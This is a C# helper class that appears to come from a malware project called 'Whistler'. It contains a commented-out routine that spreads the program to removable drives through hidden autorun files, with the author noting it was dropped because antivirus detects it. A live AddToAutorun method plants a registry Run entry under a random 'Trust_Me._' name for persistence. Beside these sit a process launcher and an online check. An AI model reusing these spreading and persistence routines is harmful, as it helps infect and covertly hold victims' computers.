using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace Whistler.Classes
{
    class classTools
    {
        public static void USB_Old()//Removed from src because its detected and outdated since win8
        {
            //try
            //{
            //    DriveInfo[] drives = DriveInfo.GetDrives();//from github - detected his father lol
            //    foreach (DriveInfo drive in drives)
            //    {
            //        if (drive.DriveType == DriveType.Removable)
            //        {
            //            StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
            //            writer.WriteLine("[autorun]\n");
            //            writer.WriteLine("open=autorun.exe");
            //            writer.WriteLine("action=Run win32");
            //            writer.Close();
            //            File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
            //            File.Copy(Application.ExecutablePath, drive.Name + "autorun.exe", true);
            //            File.SetAttributes(drive.Name + "autorun.exe", File.GetAttributes(drive.Name + "autorun.exe") | FileAttributes.Hidden);
            //        }
            //    }
            //}
            //catch { }
        }

        public static bool Start(string name, string args = "")
        {
            try
            {
                System.Diagnostics.Process.Start(name, args);
                return true;
            }
            catch { }
            return false;
        }
        public static string GenerateRandomString(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random(Guid.NewGuid().GetHashCode());
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }
        public static bool IsOnline(string website)
        {
            try
            {
                HttpWebRequest.DefaultWebProxy = new WebProxy();
                HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(website);
                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
                if (HttpStatusCode.OK == Response.StatusCode)
                {
                    Response.Close();
                    return true;
                }
                else
                {
                    Response.Close();
                    return false;
                }
            }
            catch (WebException)
            {
                return false;
            }
        }
        public static bool AddToAutorun(string path)
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue("Trust_Me._" + GenerateRandomString(8), path);
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
